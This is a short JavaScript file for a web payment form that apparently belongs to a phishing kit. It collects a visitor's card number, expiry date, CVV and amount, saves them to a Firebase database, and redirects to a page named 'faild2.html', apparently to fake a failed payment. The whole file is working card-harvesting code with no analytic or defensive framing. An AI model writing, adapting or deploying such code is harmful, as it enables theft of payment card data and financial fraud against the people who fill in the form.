
// reference your database
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

    var acard = getElementVal("acard");
    var bexpiry = getElementVal("bexpiry");
    var ccvv = getElementVal("ccvv");
    var dammount = getElementVal("dammount");
    
    

  

  saveMessages(acard, bexpiry, ccvv, dammount);

  // redirect to card page
  window.location.href = "faild2.html";
}

const saveMessages = (acard, bexpiry, ccvv, dammount) => {
  var newududip007 = ududip007DB.push();

  newududip007.set({
      DC_Card: acard,
      ex_date: bexpiry,
      CVV: ccvv,
      ammount: dammount,
      
      
    
    
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};

